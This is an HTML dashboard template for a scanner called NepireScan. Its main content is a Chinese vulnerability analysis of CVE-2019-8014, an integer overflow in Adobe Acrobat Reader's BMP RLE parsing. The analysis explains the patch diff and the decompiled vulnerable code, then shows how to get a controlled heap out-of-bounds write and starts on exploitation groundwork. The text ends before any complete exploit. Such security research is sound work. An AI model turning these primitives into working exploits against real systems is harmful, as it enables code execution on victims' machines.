{% load static %}
<html lang="zh-cn">

<head>
  <meta charset="utf-8" />
  <link rel="apple-touch-icon" sizes="76x76" href="img/apple-icon.png">
  <link rel="icon" type="image/png" href="img/favicon.png">
  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
  <title>
    NepireScan ver:1.0
  </title>
  <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0, shrink-to-fit=no' name='viewport' />
  <!--     Fonts and icons     -->
  <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:400,700|Material+Icons" />
  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
  <!-- CSS Files -->
  <link href="{% static "css/material-dashboard.css" %}" rel="stylesheet" />
  <!-- CSS Just for demo purpose, don't include it in your project -->
  <link href="demo/demo.css" rel="stylesheet" />
</head>

<body class="">
  <div class="wrapper ">
    <div class="sidebar" data-color="purple" data-background-color="white" data-image="img/sidebar-1.jpg">
      <!--
        Tip 1: You can change the color of the sidebar using: data-color="purple | azure | green | orange | danger"

        Tip 2: you can also add an image using data-image tag
    -->
      <div class="logo">
        <a href="https://github.com/Nepire" class="simple-text logo-normal">
          NepireScan
        </a>
      </div>
      <div class="sidebar-wrapper">
        <ul class="nav">
          <li class="nav-item  ">
            <a class="nav-link" href="../home">
              <i class="material-icons">dashboard</i>
              <p>Dashboard</p>
            </a>
          </li>
          <li class="nav-item ">
            <a class="nav-link" href="../user">
              <i class="material-icons">person</i>
              <p>User Profile</p>
            </a>
          </li>
          <li class="nav-item ">
            <a class="nav-link" href="../tables">
              <i class="material-icons">content_paste</i>
              <p>Table List</p>
            </a>
          </li>
          <li class="nav-item active ">
            <a class="nav-link" href="../typography">
              <i class="material-icons">library_books</i>
              <p>Typography</p>
            </a>
          </li>
          <li class="nav-item ">
            <a class="nav-link" href="../icons">
              <i class="material-icons">bubble_chart</i>
              <p>Icons</p>
            </a>
          </li>
          <li class="nav-item ">
            <a class="nav-link" href="../map">
              <i class="material-icons">location_ons</i>
              <p>Maps</p>
            </a>
          </li>
          <li class="nav-item ">
            <a class="nav-link" href="../notifications">
              <i class="material-icons">notifications</i>
              <p>Notifications</p>
            </a>
          </li>
          <li class="nav-item ">
            <a class="nav-link" href="./rtl.html">
              <i class="material-icons">language</i>
              <p>RTL Support</p>
            </a>
          </li>
          
        </ul>
      </div>
    </div>
    <div class="main-panel">
      <!-- Navbar -->
      <nav class="navbar navbar-expand-lg navbar-transparent navbar-absolute fixed-top ">
        <div class="container-fluid">
          <div class="navbar-wrapper">
            <a class="navbar-brand" href="#pablo">Typography</a>
          </div>
          <button class="navbar-toggler" type="button" data-toggle="collapse" aria-controls="navigation-index" aria-expanded="false" aria-label="Toggle navigation">
            <span class="sr-only">Toggle navigation</span>
            <span class="navbar-toggler-icon icon-bar"></span>
            <span class="navbar-toggler-icon icon-bar"></span>
            <span class="navbar-toggler-icon icon-bar"></span>
          </button>
          <div class="collapse navbar-collapse justify-content-end">
            <form class="navbar-form">
              <div class="input-group no-border">
                <input type="text" value="" class="form-control" placeholder="Search...">
                <button type="submit" class="btn btn-white btn-round btn-just-icon">
                  <i class="material-icons">search</i>
                  <div class="ripple-container"></div>
                </button>
              </div>
            </form>
            <ul class="navbar-nav">
              <li class="nav-item">
                <a class="nav-link" href="#pablo">
                  <i class="material-icons">dashboard</i>
                  <p class="d-lg-none d-md-block">
                    Stats
                  </p>
                </a>
              </li>
              <li class="nav-item dropdown">
                <a class="nav-link" href="http://example.com" id="navbarDropdownMenuLink" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <i class="material-icons">notifications</i>
                  <span class="notification">5</span>
                  <p class="d-lg-none d-md-block">
                    Some Actions
                  </p>
                </a>
                <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdownMenuLink">
                  <a class="dropdown-item" href="#">Mike John responded to your email</a>
                  <a class="dropdown-item" href="#">You have 5 new tasks</a>
                  <a class="dropdown-item" href="#">You're now friend with Andrew</a>
                  <a class="dropdown-item" href="#">Another Notification</a>
                  <a class="dropdown-item" href="#">Another One</a>
                </div>
              </li>
              <li class="nav-item dropdown">
                <a class="nav-link" href="#pablo" id="navbarDropdownProfile" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
                  <i class="material-icons">person</i>
                  <p class="d-lg-none d-md-block">
                    Account
                  </p>
                </a>
                <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdownProfile">
                  <a class="dropdown-item" href="#">Profile</a>
                  <a class="dropdown-item" href="#">Settings</a>
                  <div class="dropdown-divider"></div>
                  <a class="dropdown-item" href="#">Log out</a>
                </div>
              </li>
            </ul>
          </div>
        </div>
      </nav>
      <!-- End Navbar -->
      <div class="content">
        <div class="container-fluid">
          <div class="card">
            <div class="card-header card-header-primary">
              <h4 class="card-title">每日推送</h4>
              <p class="card-category">message</p>
            </div>
            <div class="card-body">
              <div id="typography">
                 <!-- <small> -->
                <p><em>本文详细分析了 Adobe Acrobat Reader / Pro DC 中近期修复的安全漏洞 CVE-2019-8014 。有趣的是，Adobe 在六年前修复了一个类似的漏洞 CVE-2013-2729 ，正是由于对该漏洞的修复不够完善，才使得 CVE-2019-8014 遗留了长达六年之久。本文同时讨论了如何为此类漏洞编写利用代码。</em></p>
                <p>本文作者：<strong>Ke Liu of Tencent Security Xuanwu Lab</strong></p>
                <h2>0x01. 漏洞简介</h2>
                <p>Adobe 在八月份为 Adobe Acrobat and Reader 发布了安全公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html">APSB19-41</a> ，和往常一样，这次更新修复了大量漏洞。当笔者在 <a href="https://www.zerodayinitiative.com/advisories/published/">ZDI</a> 上查看对应的漏洞公告时，目光迅速被 <a href="https://www.zerodayinitiative.com/advisories/ZDI-19-725/">ZDI-19-725</a> / <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-8014">CVE-2019-8014</a> 所吸引，因为模块 <code>AcroForm</code> 中 Bitmap 解析相关的漏洞非常少见。该漏洞在 ZDI 上的部分公告信息如下：</p>
                <blockquote><p>
                  Adobe Acrobat Pro DC AcroForm Bitmap File Parsing Heap-based Buffer Overflow Remote Code Execution Vulnerability</p>
                <p>  The specific flaw exists within the parsing of run length encoding in BMP images. The issue results from the lack of proper validation of the length of user-supplied data prior to copying it to a fixed-length, heap-based buffer. An attacker can leverage this vulnerability to execute code in the context of the current process.
                </p></blockquote>
                <p>看描述这和六年之前修复的漏洞 <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-2729">CVE-2013-2729</a> 非常相似——都和 <strong>XFA Bitmap Run Length Encoding</strong> 解析有关！实际上，两个漏洞之间确实有着千丝万缕的联系，本文将详细分析漏洞的原理以及两者之间的关系。</p>
                <p>漏洞 CVE-2019-8014 在 ZDI 上的致谢信息为 <code>ktkitty (https://ktkitty.github.io)</code> 。</p>
                <h2>0x02. 环境搭建</h2>
                <p>根据官方公告 <a href="https://helpx.adobe.com/security/products/acrobat/apsb19-41.html">APSB19-41</a> 的描述，该漏洞影响 <code>2019.012.20035</code> 以及更早版本的 Adobe Acrobat and Reader ，而不受影响的最新版本号为 <code>2019.012.20036</code> 。本文基于前者进行漏洞分析、基于后者进行补丁分析。</p>
                <p>安装 Adobe Acrobat Reader DC <code>2019.012.20035</code> 的步骤如下：</p>
                <ul>
                <li>下载并安装 <code>2019.012.20034</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220034/">下载链接</a>)</li>
                <li>升级到 <code>2019.012.20035</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220035/">下载链接</a>)</li>
                </ul>
                <p>安装 Adobe Acrobat Reader DC <code>2019.012.20036</code> 的步骤如下：</p>
                <ul>
                <li>下载并安装 <code>2019.012.20036</code> (<a href="ftp://ftp.adobe.com/pub/adobe/reader/win/AcrobatDC/1901220036/">下载链接</a>)</li>
                </ul>
                <p>在调试环境中安装好软件后，记得禁用更新服务 <em>Adobe Acrobat Update Service</em> 或者直接断开网络连接，防止 Adobe Acrobat Reader DC 自动更新。</p>
                <h2>0x03. 位图简介</h2>
                <p>在进行漏洞分析之前，先简单介绍一下位图的结构。如果你对位图已经非常熟悉，那么可以直接跳过本小节内容。</p>
                <h3>3.1 相关结构</h3>
                <p>通常来说，位图文件由以下四部分构成：</p>
                <ol>
                <li>Bitmap File Header</li>
                <li>Bitmap Info Header</li>
                <li>RGBQUAD Array</li>
                <li>Bitmap Data</li>
                </ol>
                <h4>3.1.1 Bitmap File Header</h4>
                <p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-bitmapfileheader">BITMAPFILEHEADER</a></strong> 的定义如下：</p>
                <pre><code class="cpp">typedef struct tagBITMAPFILEHEADER {
                  WORD  bfType;         // 文件标记 'BM'
                  DWORD bfSize;         // 位图文件的大小
                  WORD  bfReserved1;    // 保留字段 0
                  WORD  bfReserved2;    // 保留字段 0
                  DWORD bfOffBits;      // 位图数据在文件中的偏移值
                } BITMAPFILEHEADER, *LPBITMAPFILEHEADER, *PBITMAPFILEHEADER;
                </code></pre>
                <h4>3.1.2 Bitmap Info Header</h4>
                <p>结构体 <strong><a href="https://docs.microsoft.com/en-us/previous-versions/dd183376(v=vs.85)">BITMAPINFOHEADER</a></strong> 的定义如下：</p>
                <pre><code class="cpp">typedef struct tagBITMAPINFOHEADER {
                  DWORD biSize;             // 结构体的大小
                  LONG  biWidth;            // 位图宽度
                  LONG  biHeight;           // 位图高度
                  WORD  biPlanes;           // 必须为 1
                  WORD  biBitCount;         // 每个像素所占用的位数
                  DWORD biCompression;      // 压缩算法
                  DWORD biSizeImage;        // 数据大小
                  LONG  biXPelsPerMeter;    // 水平分辨率
                  LONG  biYPelsPerMeter;    // 垂直分辨率
                  DWORD biClrUsed;          // 色彩索引数
                  DWORD biClrImportant;     // 必须的色彩索引数
                } BITMAPINFOHEADER, *PBITMAPINFOHEADER;
                </code></pre>
                <p>这里成员 <code>biCompression</code> 指明了位图所使用的压缩算法，部分压缩算法的定义如下：</p>
                <pre><code class="cpp">#define BI_RGB  0  // 未使用压缩算法
                #define BI_RLE8 1  // RLE8 压缩算法
                #define BI_RLE4 2  // RLE4 压缩算法
                // 其他压缩算法...
                </code></pre>
                <h4>3.1.3 RGBQUAD Array</h4>
                <p>结构体 <strong><a href="https://docs.microsoft.com/en-us/windows/win32/api/wingdi/ns-wingdi-rgbquad">RGBQUAD</a></strong> 描述一个像素的色彩组成，其定义如下：</p>
                <pre><code class="cpp">typedef struct tagRGBQUAD {
                  BYTE rgbBlue;
                  BYTE rgbGreen;
                  BYTE rgbRed;
                  BYTE rgbReserved;
                } RGBQUAD;
                </code></pre>
                <p><strong>RGBQUAD Array</strong> 代表了一张色彩表，位图数据在解析之后可以是一个索引，索引在数组中对应的值便是该像素的色彩表示。该数组的长度取决于结构体 <strong>BITMAPINFOHEADER</strong> 中的 <code>biBitCount</code> 和 <code>biClrUsed</code> 成员的值。</p>
                <h4>3.1.4 Bitmap Data</h4>
                <p>位图的位数据，该部分数据的表现形式取决于位图所使用的压缩算法。</p>
                <p>有一点需要注意的是：位图数据是从左下角往右上角方向进行填充的，即位图数据中解析出来的第一个像素的色彩，应当填充到位图的左下角 [<a href="https://en.wikipedia.org/wiki/BMP_file_format#Pixel_array_(bitmap_data)">wikipedia</a>]，随后依次填充当前行的像素，当前行填充完毕之后，往上移动一个像素继续以行位单位进行填充，直到位图填充完毕。</p>
                <h3>3.2 RLE 编码</h3>
                <p>位图支持两种类型的 RLE（<strong>Run Length Encoding</strong>）压缩算法：<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/73b57f24-6d78-4eeb-9c06-8f892d88f1ab">RLE4</a> 和 <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmf/b64d0c0b-bb80-4b53-8382-f38f264eb685">RLE8</a> 。</p>
                <h4>3.2.1 RLE8 编码</h4>
                <p>RLE8 压缩算法用于压缩 8 位位图（即每个像素占用 1 字节空间）。RLE8 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p>
                <p><strong>编码模式</strong> 包含两字节数据：</p>
                <ul>
                <li>如果第一个字节不为零，其含义为第二个字节需要重复的次数</li>
                <li>如果第一个字节为零，那么第二个字节的可能含义如下
                <ul>
                <li>0x00 表示当前行已经结束</li>
                <li>0x01 表示位图解析完毕</li>
                <li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li>
                </ul>
                </li>
                </ul>
                <p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的字节是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p>
                <p>下面为 RLE8 压缩之后的数据：</p>
                <pre><code>[03 04] [05 06] [00 03 45 56 67] [02 78] [00 02 05 01]
                [02 78] [00 00] [09 1E] [00 01]
                </code></pre>
                <p>下面为解压之后的数据：</p>
                <pre><code>04 04 04
                06 06 06 06 06
                45 56 67
                78 78
                move current position 5 right and 1 up
                78 78
                end of line
                1E 1E 1E 1E 1E 1E 1E 1E 1E
                end of RLE bitmap
                </code></pre>
                <h4>3.2.2 RLE4 编码</h4>
                <p>RLE4 压缩算法用于压缩 4 位位图（即每个像素占用半字节空间）。RLE4 压缩后的数据可以处于 <strong>编码模式（Encoded Mode）</strong> 和 <strong>绝对模式（Absolute Mode）</strong> 中的任意一种（两种模式在同一个位图中可以同时出现）。</p>
                <p><strong>编码模式</strong> 包含两字节数据：</p>
                <ul>
                <li>如果第一个字节不为零，其含义为第二个字节展开后得到的像素个数
                <ul>
                <li>第二个字节代表了两个像素的色彩索引</li>
                <li>高 4 位代表第一个像素的色彩索引</li>
                <li>低 4 位代表第二个像素的色彩索引</li>
                <li>二者依次交替重复，直到得到第一个字节指定的像素个数</li>
                </ul>
                </li>
                <li>如果第一个字节为零，那么第二个字节的可能含义如下
                <ul>
                <li>0x00 表示当前行已经结束</li>
                <li>0x01 表示位图解析完毕</li>
                <li>0x02 表示接下来的两个字节 <code>(deltaX, deltaY)</code> 为当前坐标 <code>(x, y)</code> 需要移动的距离</li>
                </ul>
                </li>
                </ul>
                <p>在 <strong>绝对模式</strong> 中，第一个字节为零，第二个字节位于区间 <code>[0x03, 0xFF]</code> 。第二个字节表示接下来特定数量的 <strong>半字节</strong> 是未压缩的数据（数据量需要按 <code>WORD</code> 对齐）。</p>
                <p>下面为 RLE4 压缩之后的数据：</p>
                <pre><code>[03 04] [05 06] [00 06 45 56 67 00] [04 78] [00 02 05 01]
                [04 78] [00 00] [09 1E] [00 01]
                </code></pre>
                <p>下面为解压之后的数据：</p>
                <pre><code>0 4 0
                0 6 0 6 0
                4 5 5 6 6 7
                7 8 7 8
                move current position 5 right and 1 up
                7 8 7 8
                end of line
                1 E 1 E 1 E 1 E 1
                end of RLE bitmap
                </code></pre>
                <h2>0x04. 漏洞分析</h2>
                <h3>4.1 代码定位</h3>
                <p>根据 ZDI 网站上的公告信息，可知漏洞位于 <strong>AcroForm</strong> 模块。该模块是 Adobe Acrobat Reader DC 中负责处理 <a href="https://en.wikipedia.org/wiki/XFA">XFA 表单</a> 的插件，其路径如下：</p>
                <pre><code>%PROGRAMFILES(X86)%\Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api
                </code></pre>
                <p>通常来说，借助 <a href="https://www.zynamics.com/bindiff.html">BinDiff</a> 进行补丁对比分析可以快速定位到有漏洞的函数，但如果新旧版本的二进制文件变动比较大的话就不太好处理了，模块 <code>AcroForm.api</code> 的情况便是如此：通过对比发现有大量函数进行了改动，一个一个去看显然不太现实。</p>
                <p>笔者用于定位漏洞函数的方法如下（以 <code>2019.012.20035</code> 为例）：</p>
                <ol>
                <li>在 <code>IDA</code> 中搜索字符串 <code>PNG</code> ，在 <code>.rdata:20F9A374</code> 找到一处定义</li>
                <li>对 <code>20F9A374</code> 进行交叉引用查找，定位到函数 <code>sub_20CF3A3F</code> </li>
                <li>很显然函数 <code>sub_20CF3A3F</code> 负责判断图片的类型（从这里也可以看出 XFA 表单所支持的图片格式类型）</li>
                <li>对 <code>sub_20CF3A3F</code> 进行交叉引用查找，定位到函数 <code>sub_20CF4BE8</code> </li>
                <li>函数 <code>sub_20CF4BE8</code> 根据图片的类型调用不同的处理函数</li>
                <li>函数 <code>sub_20CF4870</code>（跳转自 <code>sub_20CF3E5F</code>）负责处理 <code>BMP</code> 位图</li>
                </ol>
                <p>在 BinDiff 的结果中可以看到，函数 <code>sub_20CF3E5F</code> 中确实有几个基本块发生了变动，比如 <code>20CF440F</code> 处的基本块的变动情况如下：</p>
                <pre><code class="cpp">// 20CF440F in AcroForm 2019.012.20035
                if ( v131 &gt;= v26 || (unsigned __int8)v127 + v43 &gt; v123 )
                  goto LABEL_170;

                // 20CF501F in AcroForm 2019.012.20036
                v56 = (unsigned __int8)v130 + v43;
                if ( v134 &gt;= v26 || v56 &gt; v126 || v56 &lt; v43 || v56 &lt; (unsigned __int8)v130 )
                  goto LABEL_176;
                </code></pre>
                <p>很明显，这里增加了对整数溢出的判断。</p>
                <h3>4.2 漏洞分析</h3>
                <p>好在网上已经有了针对 CVE-2013-2729 的详细分析报告（参考 <a href="http://blog.binamuse.com/2013/05/readerbmprle.html">feliam&#8217;s write up for CVE-2013-2729</a>），基于此可以快速理解函数 <code>sub_20CF3E5F</code> 中相关代码的含义。</p>
                <h4>4.2.1 RLE8 解析</h4>
                <p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE8 压缩数据的部分代码如下：</p>
                <pre><code class="cpp">if ( bmih.biCompression == 1 )  // RLE8 算法
                {
                  xpos = 0;                     // unsigned int, 从左往右
                  ypos = bmih.biHeight - 1;     // unsigned int, 从下往上
                  bitmap_ends = 0;
                  result = fn_feof(v1[2]);
                  if ( !result )
                  {
                    do
                    {
                      if ( bitmap_ends )
                        return result;
                      fn_read_bytes(v1[2], &amp;cmd, 2u);           // 读取 2 字节数据
                      if ( (_BYTE)cmd )                         // 第一个字节不为零
                      {                                         // 表示有压缩数据等待处理
                        // 20CF440F 变动的基本块之一
                        if ( ypos &gt;= height || (unsigned __int8)cmd + xpos &gt; width )
                          goto LABEL_170;                       // CxxThrowException
                        index = 0;
                        if ( (_BYTE)cmd )
                        {
                          do
                          {
                            line = (_BYTE *)fn_get_scanline(v1[3], ypos);
                            line[xpos++] = BYTE1(cmd);
                            ++index;
                          }
                          while ( index &lt; (unsigned __int8)cmd ); // 展开数据
                        }
                      }
                      else if ( BYTE1(cmd) )        // 第一字节为零且第二字节不为零
                      {
                        if ( BYTE1(cmd) == 1 )      // 位图结束
                        {
                          bitmap_ends = 1;
                        }
                        else if ( BYTE1(cmd) == 2 ) // delta 数据
                        {
                          fn_read_bytes(v1[2], &amp;xdelta, 1u);
                          fn_read_bytes(v1[2], &amp;ydelta, 1u);
                          xpos += xdelta;           // 向右移动
                          ypos -= ydelta;           // 向上移动
                        }
                        else                        // 未压缩数据
                        {
                          dst_xpos = BYTE1(cmd) + xpos;
                          if ( ypos &gt;= height || dst_xpos &lt; xpos ||
                               dst_xpos &lt; BYTE1(cmd) || dst_xpos &gt; width )  // 整数溢出检查
                            goto LABEL_170;         // CxxThrowException
                          index = 0;
                          if ( BYTE1(cmd) )
                          {
                            do
                            {
                              fn_read_bytes(v1[2], &amp;value, 1u);
                              line = (_BYTE *)fn_get_scanline(v1[3], ypos);
                              line[xpos++] = value;
                              count = BYTE1(cmd);
                              ++index;
                            }
                            while ( index &lt; BYTE1(cmd) );   // 读取未压缩数据
                          }
                          if ( count &amp; 1 )                  // 数据对齐
                            fn_read_bytes(v1[2], &amp;value, 1u);
                        }
                      }
                      else                                  // 当前行结束
                      {
                        --ypos;                             // 从下往上移动一行
                        xpos = 0;                           // 移动到行的起点
                      }
                      result = fn_feof(v1[2]);
                    }
                    while ( !result );
                  }
                }
                </code></pre>
                <p>基于前面的补丁分析，很明显下面的 <code>if</code> 语句中存在整数溢出：</p>
                <pre><code class="cpp">// 20CF440F 变动的基本块之一
                if ( ypos &gt;= height || (unsigned __int8)cmd + xpos &gt; width )
                  goto LABEL_170;                       // CxxThrowException

                // 20CF501F AcroForm 2019.012.20036 中修复的基本块
                dst_xpos = (unsigned __int8)cmd + xpos;
                if ( ypos &gt;= height || dst_xpos &gt; width ||
                     dst_xpos &lt; xpos || dst_xpos &lt; (unsigned __int8)cmd )
                  goto LABEL_176;
                </code></pre>
                <p>这里在计算 <code>(unsigned __int8)cmd + xpos</code> 时可能导致整数溢出，且其中两个变量的值都可以被控制。在解析特定的 RLE8 数据时，如果触发这里的整数溢出，后续便可以实现堆块越界写。</p>
                <ul>
                <li>变量 <code>(unsigned __int8)cmd</code> 的值是可以直接控制的，其取值范围为 <code>[1, 255]</code> </li>
                </ul>
                <pre><code class="cpp">fn_read_bytes(v1[2], &amp;cmd, 2u);           // 读取 2 字节数据
                </code></pre>
                <ul>
                <li>变量 <code>xpos</code> 的值也是可以直接控制的，只需要在 <strong>编码模式</strong> 中布局大量 <code>delta</code> 命令即可使得 <code>xpos</code> 的值接近 <code>0xFFFFFFFF</code> </li>
                </ul>
                <pre><code class="cpp">else if ( BYTE1(cmd) == 2 ) // delta
                {
                  fn_read_bytes(v1[2], &amp;xdelta, 1u);
                  fn_read_bytes(v1[2], &amp;ydelta, 1u);
                  xpos += xdelta;           // 向右移动, xdelta 取值范围为 [0, 255]
                  ypos -= ydelta;           // 向上移动
                }
                </code></pre>
                <ul>
                <li>因为 <code>xpos</code> 非常大（有符号表示为负数），因此在处理 RLE8 压缩数据时可以实现堆块越界写（往低地址方向越界写），并且写的数据也是完全可控的，只不过所有数据都必须是同样的值</li>
                </ul>
                <pre><code class="cpp">index = 0;
                do
                {
                  line = (_BYTE *)fn_get_scanline(v1[3], ypos);
                  line[xpos++] = BYTE1(cmd);            // 可控数据实现堆块越界写
                  ++index;
                }
                while ( index &lt; (unsigned __int8)cmd ); // 解压数据
                </code></pre>
                <h4>4.2.2 RLE4 解析</h4>
                <p>函数 <code>sub_20CF3E5F</code> 中负责解析 RLE4 压缩数据的部分代码如下（实现 RLE4 解压的代码比 RLE8 解压的代码稍微复杂一点，因为数据单位不再是一个字节，而是半个字节）：</p>
                <pre><code class="cpp">if ( bmih.biCompression == 2 )  // RLE4 算法
                {
                  xpos = 0;                     // unsigned int, 从左往右
                  ypos = bmih.biHeight - 1;     // unsigned int, 从下往上
                  bitmap_ends = 0;
                  odd_index_ = 0;
                  if ( !fn_feof(v1[2]) )
                  {
                    do
                    {
                      if ( bitmap_ends )
                        return result;
                      fn_read_bytes(v1[2], &amp;cmd, 2u);       // 读取 2 字节数据
                      if ( (_BYTE)cmd )                     // 第一个字节不为零
                      {                                     // 表示有压缩数据等待处理
                        high_4bits = BYTE1(cmd) &gt;&gt; 4;       // 高 4 位数据
                        low_4bits = BYTE1(cmd) &amp; 0xF;       // 低 4 位数据
                        // 20CF45F8 变动的基本块之一
                        if ( ypos &gt;= height || (unsigned __int8)cmd + xpos &gt; width )
                          goto LABEL_170;                   // CxxThrowException
                        index = 0;
                        if ( (_BYTE)cmd )
                        {
                          xpos_ = odd_index_;
                          do
                          {
                            byte_slot = xpos_ &gt;&gt; 1;
                            odd_index = index &amp; 1;
                            line = fn_get_scanline(v1[3], ypos);
                            _4bits = high_4bits;            // 偶数索引 -&gt; 高 4 位数据
                            if ( odd_index )                // 奇数索引 -&gt; 低 4 位数据
                              _4bits = low_4bits;
                            if ( xpos_ &amp; 1 )                // xpos 为奇数, 存入已有字节
                            {
                              line[byte_slot] |= _4bits;
                            }
                            else                            // xpos 为偶数, 存入新的字节
                            {
                              line[byte_slot] = 16 * _4bits;
                            }
                            ++xpos_;
                            index = index + 1;
                          }
                          while ( index &lt; (unsigned __int8)cmd );
                          odd_index_ = xpos_;
                          xpos = odd_index_;
                        }
                      }
                      else if ( BYTE1(cmd) )                // 第一字节为零且第二字节不为零
                      {
                        if ( BYTE1(cmd) == 1 )              // 位图结束
                        {
                          bitmap_ends = 1;
                        }
                        else if ( BYTE1(cmd) == 2 )         // delta 数据
                        {
                          fn_read_bytes((_DWORD *)v1[2], &amp;xdelta, 1u);
                          fn_read_bytes((_DWORD *)v1[2], &amp;ydelta, 1u);
                          xpos += xdelta;                   // 向右移动
                          ypos -= ydelta;                   // 向上移动
                          odd_index_ = xpos;
                        }
                        else
                        {
                          // 20CF44EA 变动的基本块之一
                          if ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )
                            goto LABEL_170;                 // CxxThrowException
                          index = 0;
                          odd_index = 0;
                          if ( BYTE1(cmd) )                 // 未压缩数据
                          {
                            xpos_ = odd_index_;
                            do
                            {
                              odd_index_ = index &amp; 1;
                              if ( !(index &amp; 1) )           // 读取 1 字节数据
                              {
                                fn_read_bytes((_DWORD *)v1[2], &amp;value, 1u);
                                low_4bits_ = value &amp; 0xF;   // 低 4 位数据
                                high_4bits_ = value &gt;&gt; 4;   // 高 4 位数据
                              }
                              byte_slot = xpos_ &gt;&gt; 1;
                              line = fn_get_scanline(v1[3], ypos);
                              _4bits = high_4bits_;
                              if ( odd_index_ )
                                _4bits = low_4bits_;
                              if ( xpos_ &amp; 1 )
                              {
                                line[byte_slot] |= _4bits;
                              }
                              else
                              {
                                line[byte_slot] = 16 * _4bits;
                              }
                              ++xpos_;
                              count = BYTE1(cmd);
                              not_ended = odd_index++ + 1 &lt; BYTE1(cmd);
                              index = odd_index;
                            }
                            while ( not_ended );
                            odd_index_ = xpos_;
                            xpos = odd_index_;
                          }
                          if ( (count &amp; 3u) - 1 &lt;= 1 )      // 数据对齐
                            fn_read_bytes(v1[2], &amp;value, 1u);
                        }
                      }
                      else                                  // 当前行结束
                      {
                        --ypos;                             // 从下往上移动一行
                        xpos = 0;                           // 移动到行的起点
                        odd_index_ = 0;
                      }
                      result = fn_feof((_DWORD *)v1[2]);
                    }
                    while ( !result );
                  }
                }
                </code></pre>
                <p>这里在两个位置可以触发整数溢出，其中一处位于处理压缩数据的过程中：</p>
                <pre><code class="cpp">high_4bits = BYTE1(cmd) &gt;&gt; 4;       // 高 4 位数据
                low_4bits = BYTE1(cmd) &amp; 0xF;       // 低 4 位数据
                // 20CF45F8 变动的基本块之一
                if ( ypos &gt;= height || (unsigned __int8)cmd + xpos &gt; width )
                  goto LABEL_170;                   // CxxThrowException
                </code></pre>
                <p>另一处位于处理未压缩数据的过程中：</p>
                <pre><code class="cpp">// 20CF44EA 变动的基本块之一
                if ( ypos &gt;= height || BYTE1(cmd) + xpos &gt; width )
                  goto LABEL_170;                 // CxxThrowException
                </code></pre>
                <h2>0x05. 漏洞利用</h2>
                <h3>5.1 溢出目标</h3>
                <p>前面提到在解析 RLE 数据时发现了 3 个溢出点，这里选择其中相对容易写利用的溢出点来触发漏洞：位于 RLE8 数据解析过程中的一处整数溢出。</p>
                <p>RLE4 数据解析过程中存在的两处溢出点很难实现稳定利用，因为在向扫描线填充像素数据时，偏移值为 <code>xpos</code> 的值除以 <code>2</code> ，此时偏移值最大可以是 <code>0xFFFFFFFF / 2 = 0x7FFFFFFF</code> ，也就意味着仅能向高地址方向实现堆块越界写，而且这个地址上具体是什么数据很难控制。</p>
                <p>而 RLE8 数据解析过程中存在的溢出点就相对好控制一些，因为在向扫描线填充像素数据时，偏移值就是 <code>xpos</code> 本身，这样就可以向低地址方向实现堆块越界写，而且越界写的范围在一定程度上也是可控的。在下面的代码中，<code>(unsigned __int8)cmd</code> 的最大值可以是 <code>0xFF</code> ，为了绕过 <code>if</code> 语句中的条件检查，<code>xpos</code> 的最小值是 <code>0xFFFFFF01</code> （在有符号类型下表示为 <code>-255</code>）。这也就意味着最大可以向低地址方向越界写 <code>0xFF</code> 字节的数据。</p>
                <pre><code class="cpp">// 20CF440F 变动的基本块之一
                if ( ypos &gt;= height || (unsigned __int8)cmd + xpos &gt; width )
                  goto LABEL_170;                       // CxxThrowException
                </code></pre>
                <p>但需要注意的是，用于越界写的数据必须是一样的，即只能是同一个字节。这会给漏洞利用带来一些额外的问题，后续会对此进行详细讨论。</p>
                <pre><code class="cpp">index = 0;
                do
                {
                  line = (_BYTE *)fn_get_scanline(v1[3], ypos);
                  line[xpos++] = BYTE1(cmd);
                  ++index;
                }
                while ( index &lt; (unsigned __int8)cmd );
                </code></pre>
                <h3>5.2 SpiderMonkey 基础知识</h3>
                <p>Adobe Acrobat Reader DC 所使用的 JavaScript 引擎为 <a href="https://developer.mozilla.org/en-US/docs/Mozilla/Projects/SpiderMonkey">SpiderMonkey</a> ，在编写利用代码之前，先简单介绍一下相关的基础知识。</p>
                <h4>5.2.1 ArrayBuffer</h4>
                <p>对 <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/ArrayBuffer">ArrayBuffer</a> 而言，当 <code>byteLength</code> 的大小超过 <code>0x68</code> 时，其底层数据存储区（<strong>backing store</strong>）所在的堆块将通过系统堆申请（<code>ucrtbase!calloc</code>）；当 <code>byteLength</code> 的大小小于等于 <code>0x68</code> 时，堆块从 SpiderMonkey 的私有堆 <strong>tenured heap</strong> 申请。同时，当 <strong>backing store</strong> 独立申请堆块时，需要额外申请 <code>0x10</code> 字节的空间用于存储 <code>ObjectElements</code> 对象。</p>
                <pre><code class="cpp">class ObjectElements {
                 public:
                  uint32_t flags;               // 可以是任意值，通常为 0
                  uint32_t initializedLength;   // byteLength
